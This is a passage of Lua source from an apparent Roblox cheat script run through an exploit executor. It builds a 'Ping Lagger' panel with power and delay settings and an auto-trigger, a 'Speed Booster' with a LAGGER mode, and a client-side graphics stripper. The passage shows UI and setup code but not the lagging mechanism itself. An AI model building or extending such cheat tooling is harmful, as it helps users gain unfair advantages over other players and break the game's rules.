    row.BorderSizePixel = 0
    row.ZIndex = 3
    Instance.new("UICorner", row).CornerRadius = UDim.new(0, 12)
    local rowStroke = Instance.new("UIStroke", row)
    rowStroke.Color = WHITE
    rowStroke.Thickness = 1
    rowStroke.Transparency = 0.75

    local badge = Instance.new("Frame", row)
    badge.Size = UDim2.new(0, 32, 0, 32)
    badge.Position = UDim2.new(0, 10, 0.5, -16)
    badge.BackgroundColor3 = BLACK
    badge.BorderSizePixel = 0
    badge.ZIndex = 4
    Instance.new("UICorner", badge).CornerRadius = UDim.new(1, 0)
    local badgeTxt = Instance.new("TextLabel", badge)
    badgeTxt.Size = UDim2.new(1, 0, 1, 0)
    badgeTxt.BackgroundTransparency = 1
    badgeTxt.Text = "M"
    badgeTxt.TextColor3 = WHITE
    badgeTxt.Font = Enum.Font.GothamBlack
    badgeTxt.TextSize = 14
    badgeTxt.ZIndex = 5

    local rowTitle = Instance.new("TextLabel", row)
    rowTitle.Size = UDim2.new(0, 140, 0, 18)
    rowTitle.Position = UDim2.new(0, 50, 0, 8)
    rowTitle.BackgroundTransparency = 1
    rowTitle.Text = "Ping Lagger"
    rowTitle.TextColor3 = WHITE
    rowTitle.Font = Enum.Font.GothamBold
    rowTitle.TextSize = 13
    rowTitle.TextXAlignment = Enum.TextXAlignment.Left
    rowTitle.ZIndex = 4

    local rowSub = Instance.new("TextLabel", row)
    rowSub.Size = UDim2.new(0, 140, 0, 16)
    rowSub.Position = UDim2.new(0, 50, 0, 26)
    rowSub.BackgroundTransparency = 1
    rowSub.Text = "Ready [" .. tostring(M.pingKeybindKb or "T") .. "]"
    rowSub.TextColor3 = Color3.fromRGB(150, 150, 150)
    rowSub.Font = Enum.Font.Gotham
    rowSub.TextSize = 11
    rowSub.TextXAlignment = Enum.TextXAlignment.Left
    rowSub.ZIndex = 4

    local toggleTrack = Instance.new("TextButton", row)
    toggleTrack.Name = "PingToggle"
    toggleTrack.Size = UDim2.new(0, 44, 0, 24)
    toggleTrack.Position = UDim2.new(1, -56, 0.5, -12)
    toggleTrack.BackgroundColor3 = M.pingActive and WHITE or Color3.fromRGB(40, 40, 40)
    toggleTrack.BorderSizePixel = 0
    toggleTrack.Text = ""
    toggleTrack.AutoButtonColor = false
    toggleTrack.ZIndex = 5
    Instance.new("UICorner", toggleTrack).CornerRadius = UDim.new(1, 0)
    local knob = Instance.new("Frame", toggleTrack)
    knob.Size = UDim2.new(0, 18, 0, 18)
    knob.Position = M.pingActive and UDim2.new(1, -21, 0.5, -9) or UDim2.new(0, 3, 0.5, -9)
    knob.BackgroundColor3 = M.pingActive and BLACK or Color3.fromRGB(220, 220, 220)
    knob.BorderSizePixel = 0
    knob.ZIndex = 6
    Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)

    toggleTrack.MouseButton1Click:Connect(function()
        M.setPingActive(not M.pingActive, true)
    end)

    function M._pingRefreshVisual()
        local on = M.pingActive == true
        statusLbl.Text = on and "ON" or "READY"
        statusPill.BackgroundColor3 = on and WHITE or Color3.fromRGB(245, 245, 245)
        statusLbl.TextColor3 = BLACK
        toggleTrack.BackgroundColor3 = on and WHITE or Color3.fromRGB(40, 40, 40)
        knob.Position = on and UDim2.new(1, -21, 0.5, -9) or UDim2.new(0, 3, 0.5, -9)
        knob.BackgroundColor3 = on and BLACK or Color3.fromRGB(220, 220, 220)
        rowSub.Text = (on and "Active" or "Ready") .. " [" .. tostring(M.pingKeybindKb or "T") .. "]"
    end
    M._pingRefreshVisual()

    gearBtn.MouseButton1Click:Connect(function()
        if M.pingSettings then
            M.pingSettings.Visible = not M.pingSettings.Visible
        end
    end)

    -- Settings sub-panel
    local SET_W, SET_H = 230, 300
    local settingsFrame = Instance.new("Frame")
    settingsFrame.Name = "VynxPingLaggerSettings"
    settingsFrame.Size = UDim2.new(0, SET_W, 0, SET_H)
    settingsFrame.Position = UDim2.new(0.5, -SET_W/2, 0.22, MAIN_H + 12)
    settingsFrame.BackgroundColor3 = BLACK
    settingsFrame.BackgroundTransparency = 0
    settingsFrame.BorderSizePixel = 0
    settingsFrame.Visible = false
    settingsFrame.Active = true
    settingsFrame.ClipsDescendants = true
    settingsFrame.ZIndex = 20
    settingsFrame.Parent = gui
    Instance.new("UICorner", settingsFrame).CornerRadius = UDim.new(0, 12)
    local ss = Instance.new("UIStroke", settingsFrame)
    ss.Color = WHITE
    ss.Thickness = 1.3
    ss.Transparency = 0.35
    M.pingSettings = settingsFrame
    pcall(function()
        if M.applyPanelBackground then M.applyPanelBackground(settingsFrame, UDim.new(0, 12)) end
    end)

    do
        local dragging, dragStart, startPos
        settingsFrame.InputBegan:Connect(function(i)
            if M.pingLocked then return end
            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
                dragging = true; dragStart = i.Position; startPos = settingsFrame.Position
                i.Changed:Connect(function()
                    if i.UserInputState == Enum.UserInputState.End then dragging = false end
                end)
            end
        end)
        UIS.InputChanged:Connect(function(i)
            if M.pingLocked then dragging = false; return end
            if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
                local d = i.Position - dragStart
                settingsFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
            end
        end)
    end

    local setHeader = Instance.new("Frame", settingsFrame)
    setHeader.Size = UDim2.new(1, 0, 0, 32)
    setHeader.BackgroundTransparency = 1
    setHeader.BorderSizePixel = 0
    setHeader.ZIndex = 21
    local setTitle = Instance.new("TextLabel", setHeader)
    setTitle.Size = UDim2.new(1, -40, 1, 0)
    setTitle.Position = UDim2.new(0, 12, 0, 0)
    setTitle.BackgroundTransparency = 1
    setTitle.Text = "Xim Duels SETTINGS"
    setTitle.TextColor3 = WHITE
    setTitle.Font = Enum.Font.GothamBlack
    setTitle.TextSize = 11
    setTitle.TextXAlignment = Enum.TextXAlignment.Left
    setTitle.TextStrokeTransparency = 0.35
    setTitle.TextStrokeColor3 = BLACK
    setTitle.ZIndex = 22
    local setClose = Instance.new("TextButton", setHeader)
    setClose.Size = UDim2.new(0, 24, 0, 24)
    setClose.Position = UDim2.new(1, -28, 0.5, -12)
    setClose.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
    setClose.Text = "X"
    setClose.TextColor3 = WHITE
    setClose.Font = Enum.Font.GothamBlack
    setClose.TextSize = 11
    setClose.ZIndex = 23
    setClose.BorderSizePixel = 0
    Instance.new("UICorner", setClose).CornerRadius = UDim.new(0, 6)
    setClose.MouseButton1Click:Connect(function()
        settingsFrame.Visible = false
    end)

    local function mkRow(y, label, valueText)
        local r = Instance.new("Frame", settingsFrame)
        r.Size = UDim2.new(1, -16, 0, 34)
        r.Position = UDim2.new(0, 8, 0, y)
        r.BackgroundColor3 = CARD
        r.BorderSizePixel = 0
        r.ZIndex = 21
        Instance.new("UICorner", r).CornerRadius = UDim.new(0, 8)
        local lbl = Instance.new("TextLabel", r)
        lbl.Size = UDim2.new(0.48, 0, 1, 0)
        lbl.Position = UDim2.new(0, 10, 0, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = label
        lbl.TextColor3 = WHITE
        lbl.Font = Enum.Font.GothamBold
        lbl.TextSize = 11
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.ZIndex = 22
        local box = Instance.new("TextBox", r)
        box.Size = UDim2.new(0, 70, 0, 24)
        box.Position = UDim2.new(1, -78, 0.5, -12)
        box.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
        box.BorderSizePixel = 0
        box.Text = valueText
        box.TextColor3 = RED_SOFT
        box.Font = Enum.Font.GothamBold
        box.TextSize = 11
        box.ClearTextOnFocus = false
        box.ZIndex = 23
        Instance.new("UICorner", box).CornerRadius = UDim.new(0, 6)
        return box
    end

    local powerBox = mkRow(42, "Power", tostring(M.pingPower))
    powerBox.FocusLost:Connect(function()
        local n = tonumber(powerBox.Text)
        if n then M.pingPower = math.max(1, n); powerBox.Text = tostring(M.pingPower); pcall(saveCherryConfig) end
    end)
    local intervalBox = mkRow(82, "Delay (s)", tostring(M.pingInterval))
    intervalBox.FocusLost:Connect(function()
        local n = tonumber(intervalBox.Text)
        if n then M.pingInterval = math.max(0.01, n); intervalBox.Text = tostring(M.pingInterval); pcall(saveCherryConfig) end
    end)

    local brRow = Instance.new("Frame", settingsFrame)
    brRow.Size = UDim2.new(1, -16, 0, 34)
    brRow.Position = UDim2.new(0, 8, 0, 122)
    brRow.BackgroundColor3 = CARD
    brRow.BorderSizePixel = 0
    brRow.ZIndex = 21
    Instance.new("UICorner", brRow).CornerRadius = UDim.new(0, 8)
    local brLbl = Instance.new("TextLabel", brRow)
    brLbl.Size = UDim2.new(0.6, 0, 1, 0)
    brLbl.Position = UDim2.new(0, 10, 0, 0)
    brLbl.BackgroundTransparency = 1
    brLbl.Text = "Auto Brainrot"
    brLbl.TextColor3 = WHITE
    brLbl.Font = Enum.Font.GothamBold
    brLbl.TextSize = 11
    brLbl.TextXAlignment = Enum.TextXAlignment.Left
    brLbl.ZIndex = 22
    local brBtn = Instance.new("TextButton", brRow)
    brBtn.Size = UDim2.new(0, 52, 0, 24)
    brBtn.Position = UDim2.new(1, -60, 0.5, -12)
    brBtn.BackgroundColor3 = M.pingAutoBrainrot and GREEN or Color3.fromRGB(40, 40, 40)
    brBtn.BorderSizePixel = 0
    brBtn.Text = M.pingAutoBrainrot and "ON" or "OFF"
    brBtn.TextColor3 = M.pingAutoBrainrot and BLACK or WHITE
    brBtn.Font = Enum.Font.GothamBlack
    brBtn.TextSize = 10
    brBtn.ZIndex = 23
    Instance.new("UICorner", brBtn).CornerRadius = UDim.new(1, 0)
    brBtn.MouseButton1Click:Connect(function()
        M.pingAutoBrainrot = not M.pingAutoBrainrot
        brBtn.Text = M.pingAutoBrainrot and "ON" or "OFF"
        brBtn.BackgroundColor3 = M.pingAutoBrainrot and GREEN or Color3.fromRGB(40, 40, 40)
        brBtn.TextColor3 = M.pingAutoBrainrot and BLACK or WHITE
        pcall(saveCherryConfig)
    end)

    local function mkBind(y, label, which)
        local r = Instance.new("Frame", settingsFrame)
        r.Size = UDim2.new(1, -16, 0, 34)
        r.Position = UDim2.new(0, 8, 0, y)
        r.BackgroundColor3 = CARD
        r.BorderSizePixel = 0
        r.ZIndex = 21
        Instance.new("UICorner", r).CornerRadius = UDim.new(0, 8)
        local lbl = Instance.new("TextLabel", r)
        lbl.Size = UDim2.new(0.4, 0, 1, 0)
        lbl.Position = UDim2.new(0, 10, 0, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = label
        lbl.TextColor3 = WHITE
        lbl.Font = Enum.Font.GothamBold
        lbl.TextSize = 11
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.ZIndex = 22
        local btn = Instance.new("TextButton", r)
        btn.Size = UDim2.new(0, 78, 0, 24)
        btn.Position = UDim2.new(1, -86, 0.5, -12)
        btn.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
        btn.BorderSizePixel = 0
        btn.Text = which == "kb" and (M.pingKeybindKb or "T") or (M.pingKeybindGp or "ButtonR2")
        btn.TextColor3 = RED_SOFT
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 10
        btn.ZIndex = 23
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
        btn.MouseButton1Click:Connect(function()
            M.pingListening = which
            btn.Text = "Press..."
            btn.TextColor3 = Color3.fromRGB(255, 210, 80)
        end)
        return btn
    end
    local kbBtn = mkBind(166, "Keyboard", "kb")
    local gpBtn = mkBind(206, "Controller", "gp")

    local function vynxPingResolveKb(name)
        if not name or name == "" then return nil end
        local ok, e = pcall(function() return Enum.KeyCode[name] end)
        if ok and e then return e end
        return nil
    end
    local function vynxPingIsGamepad(kc)
        local n = kc and kc.Name or ""
        return n:find("Button") == 1 or n:find("DPad") == 1 or n:find("Thumbstick") == 1
    end

    if M._pingInputConn then pcall(function() M._pingInputConn:Disconnect() end) end
    M._pingInputConn = UIS.InputBegan:Connect(function(input, processed)
        local kc = input.KeyCode
        if kc == Enum.KeyCode.Unknown then return end
        local isGp = vynxPingIsGamepad(kc)
        local isKb = input.UserInputType == Enum.UserInputType.Keyboard
        if M.pingListening then
            if kc == Enum.KeyCode.Escape then
                M.pingListening = nil
                kbBtn.Text = M.pingKeybindKb or "T"
                gpBtn.Text = M.pingKeybindGp or "ButtonR2"
                kbBtn.TextColor3 = RED_SOFT
                gpBtn.TextColor3 = RED_SOFT
                return
            end
            if M.pingListening == "kb" and isKb then
                M.pingKeybindKb = kc.Name
                if M.KB and M.KB.PingLagger then M.KB.PingLagger.kb = kc end
                M.pingListening = nil
                kbBtn.Text = kc.Name
                kbBtn.TextColor3 = RED_SOFT
                pcall(saveCherryConfig)
                return
            end
            if M.pingListening == "gp" and isGp then
                M.pingKeybindGp = kc.Name
                if M.KB and M.KB.PingLagger then M.KB.PingLagger.gp = kc end
                M.pingListening = nil
                gpBtn.Text = kc.Name
                gpBtn.TextColor3 = RED_SOFT
                pcall(saveCherryConfig)
                return
            end
            return
        end
        if processed then return end
        local kbEnum = vynxPingResolveKb(M.pingKeybindKb)
        local gpEnum = vynxPingResolveKb(M.pingKeybindGp)
        if M.pingPanelOpen and ((kbEnum and kc == kbEnum and isKb) or (gpEnum and kc == gpEnum and isGp)) then
            M.setPingActive(not M.pingActive, true)
        end
    end)

    if M._pingBrainrotConn then pcall(function() M._pingBrainrotConn:Disconnect() end) end
    M._pingBrainrotConn = RunService.Heartbeat:Connect(function()
        if not M.pingPanelOpen then
            if M.pingActive then M.pingActive = false end
            if M.pingBrainrotMode then
                M.pingBrainrotMode = false
                M.pingLastBrainrot = false
            end
            return
        end
        if not M.pingAutoBrainrot then
            if M.pingBrainrotMode then
                M.pingBrainrotMode = false
                M.pingLastBrainrot = false
            end
            return
        end
        local char = player.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        local hasBrainrot = hum.WalkSpeed < 25
        if hasBrainrot and not M.pingLastBrainrot then
            M.pingBrainrotMode = true
            M.pingLastBrainrot = true
            M.pingManualOverride = false
            M.setPingActive(true, false)
        elseif not hasBrainrot and M.pingLastBrainrot then
            M.pingBrainrotMode = false
            M.pingLastBrainrot = false
            M.pingManualOverride = false
            M.setPingActive(false, false)
        end
    end)
end

function M.setPingPanelOpen(on)
    M.pingPanelOpen = on and true or false
    if M.pingPanelOpen and (not M.pingGui or not M.pingGui.Parent) then
        M.buildPingLaggerUI()
    end
    if M.pingMain then
        M.pingMain.Visible = M.pingPanelOpen
    end
    if not M.pingPanelOpen then
        M.pingActive = false
        M.pingBrainrotMode = false
        M.pingLastBrainrot = false
        M.pingManualOverride = false
        if M._pingRefreshVisual then pcall(M._pingRefreshVisual) end
    end
    if M.setPingPanelVisual then
        pcall(function() M.setPingPanelVisual(M.pingPanelOpen) end)
    end
    pcall(saveCherryConfig)
end



-- ===== NUKE OPTIMIZER (ported) =====
function M.enableNukeOptimizer()
    if M._NukeOn then return end
    M._NukeOn = true
    M.nukeOptEnabled = true
    local LightingSvc = game:GetService("Lighting")
    local MaterialService = game:GetService("MaterialService")
    local XMin, XMax = -560, -240
    local ClothingClasses = {"Shirt","Pants","ShirtGraphic","Accessory","Hat","HairAccessory","FaceAccessory","NeckAccessory","ShoulderAccessory","FrontAccessory","BackAccessory","WaistAccessory"}
    local BASE_NAMES = {"baseplate","spawnlocation","spawn location","spawn"}
    local function IsUnderPlots(obj)
        
        if not obj then return false end
        if M._isUnderPlots and M._isUnderPlots(obj) then return true end
        local p = obj
        while p and p ~= game do
            if p.Name == "Plots" or p.Name == "AnimalPodiums" or p.Name == "PlotSign" then
                return true
            end
            local nl = tostring(p.Name):lower()
            if nl:find("plot", 1, true) or nl:find("base", 1, true) and p:IsA("Model") then
                
                local q = p.Parent
                while q and q ~= game do
                    if q.Name == "Plots" then return true end
                    q = q.Parent
                end
            end
            p = p.Parent
        end
        return false
    end
    local function IsCharacterPart(obj)
        if not obj then return false end
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character and obj:IsDescendantOf(plr.Character) then return true end
        end
        -- also treat Humanoid-parent models as characters (npcs/avatars)
        local p = obj
        while p and p ~= game do
            if p:IsA("Model") and p:FindFirstChildOfClass("Humanoid") then
                return true
            end
            p = p.Parent
        end
        return false
    end
    local function SafeDestroy(obj)
        if not obj or obj.Name == "Overhead" then return end
        if IsUnderPlots(obj) then return end
        if IsCharacterPart(obj) then return end
        if obj:IsA("Beam") or obj:IsA("Laser") then return end
        pcall(function() obj:Destroy() end)
    end
    local function IsClothing(obj)
        -- never treat character clothing as destroyable via clothing path alone
        if IsCharacterPart(obj) then return false end
        for _, c in ipairs(ClothingClasses) do if obj:IsA(c) then return true end end
        return false
    end
    local function IsOutOfRange(obj)
        if IsUnderPlots(obj) then return false end
        if obj:IsA("BasePart") then
            local x = obj.Position.X
            return x < XMin or x > XMax
        end
        return false
    end
    local function IsBase(obj)
        
        if IsUnderPlots(obj) then return false end
        if not obj:IsA("BasePart") then return false end
        local nl = obj.Name:lower()
        for _, n in ipairs(BASE_NAMES) do
            if nl:find(n, 1, true) then return true end
        end
        return false
    end
    local function IsInBase(obj)
        if IsUnderPlots(obj) then return true end 
        local p = obj.Parent
        while p and p ~= workspace do
            if IsBase(p) then return true end
            p = p.Parent
        end
        return false
    end
    local function MakeTransparent(obj)
        
        if IsUnderPlots(obj) then return end
        pcall(function()
            if IsBase(obj) and not IsCharacterPart(obj) then
                obj.Transparency = 1
                obj.CastShadow = false
            end
        end)
    end
    local function StripObject(obj)
        pcall(function()
            if obj:IsA("Texture") or obj:IsA("Decal") or obj:IsA("SpecialMesh") then
                SafeDestroy(obj)
            elseif obj:IsA("Beam") then
                
                return
            elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Smoke") or obj:IsA("Fire") or obj:IsA("Sparkles") then
                pcall(function() obj.Enabled = false end)
                SafeDestroy(obj)
            elseif obj:IsA("SurfaceAppearance") then
                SafeDestroy(obj)
            elseif obj:IsA("BasePart") then
                obj.CastShadow = false
                obj.Material = Enum.Material.Plastic
                pcall(function() obj.MaterialVariant = "" end)
                obj.Reflectance = 0
            end
        end)
    end
    local function CleanObject(obj)
        pcall(function()
            if obj:IsA("SurfaceAppearance") then
                SafeDestroy(obj)
            elseif obj:IsA("Decal") or obj:IsA("Texture") then
                if not (obj.Name == "face" and obj.Parent and obj.Parent.Name == "Head") then
                    SafeDestroy(obj)
                end
            elseif obj:IsA("SpecialMesh") then
                SafeDestroy(obj)
            end
        end)
    end
    local function ApplyGreySky()
        pcall(function()
            for _, obj in ipairs(LightingSvc:GetChildren()) do
                if obj:IsA("Sky") then obj:Destroy() end
            end
            local sky = Instance.new("Sky")
            sky.SkyboxBk = ""; sky.SkyboxDn = ""; sky.SkyboxFt = ""
            sky.SkyboxLf = ""; sky.SkyboxRt = ""; sky.SkyboxUp = ""
            sky.CelestialBodiesShown = false
            sky.Name = "_VynxNukeSky"
            sky.Parent = LightingSvc
        end)
    end
    local function OptimizeLighting()
        LightingSvc.GlobalShadows = false
        LightingSvc.FogEnd = 9e9
        LightingSvc.FogStart = 9e9
        LightingSvc.EnvironmentDiffuseScale = 0
        LightingSvc.EnvironmentSpecularScale = 0
        LightingSvc.Brightness = 1.5
        LightingSvc.Ambient = Color3.fromRGB(60, 60, 60)
        for _, v in ipairs(LightingSvc:GetChildren()) do
            if v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("ColorCorrectionEffect")
                or v:IsA("SunRaysEffect") or v:IsA("DepthOfFieldEffect")
                or v:IsA("Atmosphere") or v:IsA("Clouds") then
                v:Destroy()
            end
        end
        ApplyGreySky()
    end
    local function ApplyTerrain()
        pcall(function()
            local t = workspace:FindFirstChildOfClass("Terrain")
            if t then
                t.Decoration = false
                pcall(function() t.WaterWaveSize = 0 end)
                pcall(function() t.WaterWaveSpeed = 0 end)
                pcall(function() t.WaterReflectance = 0 end)
                pcall(function() t.WaterTransparency = 1 end)
            end
        end)
    end
    local function OptimizeCharacter(char)
        -- never modify player avatars / clothing / accessories
        return
    end
    pcall(function()
        settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
        settings().Rendering.MeshPartDetailLevel = Enum.MeshPartDetailLevel.Level01
    end)
    pcall(function() if setfpscap then setfpscap(999) end end)
    table.insert(M._NukeThreads, task.spawn(function()
        if not game:IsLoaded() then game.Loaded:Wait() end
        OptimizeLighting()
        ApplyTerrain()
        for _, obj in ipairs(workspace:GetDescendants()) do
            if not M._NukeOn then return end
            if IsUnderPlots(obj) then
                
            elseif IsBase(obj) then
                MakeTransparent(obj)
            elseif IsClothing(obj) then
                SafeDestroy(obj)
            elseif IsInBase(obj) then
            elseif IsCharacterPart(obj) then
            elseif IsOutOfRange(obj) then
                SafeDestroy(obj)
            else
                CleanObject(obj)
                StripObject(obj)
            end
        end
        for _, obj in ipairs(workspace:GetDescendants()) do
            if not IsUnderPlots(obj) then
                MakeTransparent(obj)
            end
        end
    end))
    table.insert(M._NukeConns, workspace.DescendantAdded:Connect(function(obj)
        if not M._NukeOn then return end
        task.defer(function()
            if not M._NukeOn then return end
            if IsUnderPlots(obj) then return end
            if IsBase(obj) then MakeTransparent(obj); return end
            if IsClothing(obj) then SafeDestroy(obj)
            elseif IsInBase(obj) then
            elseif IsCharacterPart(obj) then
            elseif IsOutOfRange(obj) then SafeDestroy(obj)
            else CleanObject(obj); StripObject(obj) end
        end)
    end))
    table.insert(M._NukeConns, LightingSvc.DescendantAdded:Connect(function(obj)
        if not M._NukeOn then return end
        if obj:IsA("Atmosphere") or obj:IsA("Clouds") or obj:IsA("PostEffect") then
            SafeDestroy(obj)
        end
    end))
    table.insert(M._NukeConns, MaterialService.DescendantAdded:Connect(function(obj)
        if not M._NukeOn then return end
        SafeDestroy(obj)
    end))
    for _, plr in ipairs(Players:GetPlayers()) do
        OptimizeCharacter(plr.Character)
        table.insert(M._NukeConns, plr.CharacterAdded:Connect(OptimizeCharacter))
    end
    table.insert(M._NukeConns, Players.PlayerAdded:Connect(function(plr)
        table.insert(M._NukeConns, plr.CharacterAdded:Connect(OptimizeCharacter))
    end))
    table.insert(M._NukeThreads, task.spawn(function()
        while M._NukeOn do
            task.wait(15)
            pcall(function() collectgarbage("collect") end)
        end
    end))
end

function M.disableNukeOptimizer()
    M._NukeOn = false
    M.nukeOptEnabled = false
    for _, c in ipairs(M._NukeConns) do pcall(function() c:Disconnect() end) end
    M._NukeConns = {}
    M._NukeThreads = {}
end

-- ===== SPEED CUSTOMIZER / BOOSTER UI =====
function M.resetSpeedBoosterPosition()
    M.speedBoosterPos = nil
    if M.speedBoosterMain then
        M.speedBoosterMain.Position = UDim2.new(0, 20, 0.35, 0)
    end
    pcall(saveCherryConfig)
end

function M.buildSpeedBoosterUI()
    if M.speedBoosterGui then
        pcall(function() M.speedBoosterGui:Destroy() end)
        M.speedBoosterGui = nil
        M.speedBoosterMain = nil
    end
    
    local ACCENT = (M.Theme and M.Theme.Accent) or M.UI_ACCENT or UI_ACCENT or Color3.fromRGB(0, 255, 170)
    local gui = Instance.new("ScreenGui")
    gui.Name = "VynxSpeedBooster"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.DisplayOrder = 45
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    pcall(function()
        if gethui then gui.Parent = gethui() else gui.Parent = game:GetService("CoreGui") end
    end)
    if not gui.Parent then gui.Parent = player:WaitForChild("PlayerGui") end
    M.speedBoosterGui = gui

    
    local main = Instance.new("Frame")
    main.Name = "Main"
    main.Size = UDim2.new(0, 168, 0, 168)
    if type(M.speedBoosterPos) == "table" then
        local p = M.speedBoosterPos
        main.Position = UDim2.new(p[1] or 0, p[2] or 20, p[3] or 0.35, p[4] or 0)
    else
        main.Position = UDim2.new(0, 20, 0.35, 0)
    end
    main.BackgroundColor3 = Color3.fromRGB(12, 14, 18)
    main.BackgroundTransparency = 0.04
    main.BorderSizePixel = 0
    main.Active = true
    main.ClipsDescendants = true
    main.Visible = (M.speedUIMode or "Original") ~= "Original" and (M.speedBoosterPanelOpen ~= false)
    main.Parent = gui
    Instance.new("UICorner", main).CornerRadius = UDim.new(0, 10)
    local st = Instance.new("UIStroke"); st.Color = ACCENT; st.Thickness = 1.2; st.Transparency = 0.4; st.Parent = main
    M.speedBoosterMain = main

    local header = Instance.new("Frame")
    header.Size = UDim2.new(1, 0, 0, 26)
    header.BackgroundTransparency = 1
    header.Active = true
    header.Parent = main

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, -28, 1, 0)
    title.Position = UDim2.new(0, 8, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = "Speed"
    title.TextColor3 = ACCENT
    title.Font = Enum.Font.GothamBold
    title.TextSize = 11
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = header

    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 20, 0, 20)
    closeBtn.Position = UDim2.new(1, -24, 0.5, -10)
    closeBtn.BackgroundColor3 = Color3.fromRGB(22, 24, 30)
    closeBtn.BorderSizePixel = 0
    closeBtn.Text = "x"
    closeBtn.TextColor3 = ACCENT
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.TextSize = 11
    closeBtn.AutoButtonColor = false
    closeBtn.Parent = header
    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 5)

    do
        local dragging, dragStart, startPos
        header.InputBegan:Connect(function(input)
            if M.uiLocked then return end
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                dragStart = input.Position
                startPos = main.Position
                input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then
                        dragging = false
                        M.speedBoosterPos = {main.Position.X.Scale, main.Position.X.Offset, main.Position.Y.Scale, main.Position.Y.Offset}
                        pcall(saveCherryConfig)
                    end
                end)
            end
        end)
        UIS.InputChanged:Connect(function(input)
            if not dragging or M.uiLocked then return end
            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
                local d = input.Position - dragStart
                main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
            end
        end)
    end
    closeBtn.MouseButton1Click:Connect(function()
        M.speedBoosterPanelOpen = false
        main.Visible = false
        pcall(saveCherryConfig)
    end)

    local body = Instance.new("Frame")
    body.Size = UDim2.new(1, -12, 1, -32)
    body.Position = UDim2.new(0, 6, 0, 28)
    body.BackgroundTransparency = 1
    body.Parent = main

    -- trust speedBoosterPath only (do not force Lagger from stale flags)
    local path = (tostring(M.speedBoosterPath) == "Lagger") and "Lagger" or "Normal"
    M.speedBoosterPath = path

    local seg = Instance.new("Frame")
    seg.Size = UDim2.new(1, 0, 0, 24)
    seg.BackgroundColor3 = Color3.fromRGB(18, 20, 26)
    seg.BorderSizePixel = 0
    seg.Parent = body
    Instance.new("UICorner", seg).CornerRadius = UDim.new(0, 7)

    local normalBtn = Instance.new("TextButton")
    normalBtn.Size = UDim2.new(0.5, -3, 1, -4)
    normalBtn.Position = UDim2.new(0, 2, 0, 2)
    normalBtn.BorderSizePixel = 0
    normalBtn.Text = "NORMAL"
    normalBtn.Font = Enum.Font.GothamBold
    normalBtn.TextSize = 9
    normalBtn.AutoButtonColor = false
    normalBtn.Parent = seg
    Instance.new("UICorner", normalBtn).CornerRadius = UDim.new(0, 6)

    local laggerBtn = Instance.new("TextButton")
    laggerBtn.Size = UDim2.new(0.5, -3, 1, -4)
    laggerBtn.Position = UDim2.new(0.5, 1, 0, 2)
    laggerBtn.BorderSizePixel = 0
    laggerBtn.Text = "LAGGER"
    laggerBtn.Font = Enum.Font.GothamBold
    laggerBtn.TextSize = 9
    laggerBtn.AutoButtonColor = false
    laggerBtn.Parent = seg
    Instance.new("UICorner", laggerBtn).CornerRadius = UDim.new(0, 6)

    local function paintSeg()
        if path == "Normal" then
            normalBtn.BackgroundColor3 = ACCENT; normalBtn.TextColor3 = Color3.fromRGB(10,12,14)
            laggerBtn.BackgroundColor3 = Color3.fromRGB(22,24,30); laggerBtn.TextColor3 = ACCENT
        else
            laggerBtn.BackgroundColor3 = ACCENT; laggerBtn.TextColor3 = Color3.fromRGB(10,12,14)
            normalBtn.BackgroundColor3 = Color3.fromRGB(22,24,30); normalBtn.TextColor3 = ACCENT
        end
    end
    paintSeg()

    local function makeValueRow(y, labelText)
        local row = Instance.new("Frame")
        row.Size = UDim2.new(1, 0, 0, 26)
        row.Position = UDim2.new(0, 0, 0, y)
        row.BackgroundColor3 = Color3.fromRGB(18, 20, 26)
        row.BorderSizePixel = 0
        row.Parent = body
        Instance.new("UICorner", row).CornerRadius = UDim.new(0, 7)
        local lbl = Instance.new("TextLabel")
        lbl.Size = UDim2.new(0.48, 0, 1, 0)
        lbl.Position = UDim2.new(0, 8, 0, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = labelText
        lbl.TextColor3 = ACCENT
        lbl.Font = Enum.Font.GothamBold
        lbl.TextSize = 10
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.Parent = row
        return row
    end

    local statusRow = makeValueRow(30, "Status")
    local statusBtn = Instance.new("TextButton")
    statusBtn.Size = UDim2.new(0, 44, 0, 18)
    statusBtn.Position = UDim2.new(1, -50, 0.5, -9)
    statusBtn.BorderSizePixel = 0
    statusBtn.Font = Enum.Font.GothamBold
    statusBtn.TextSize = 9
    statusBtn.AutoButtonColor = false
    statusBtn.Parent = statusRow
    Instance.new("UICorner", statusBtn).CornerRadius = UDim.new(0, 6)

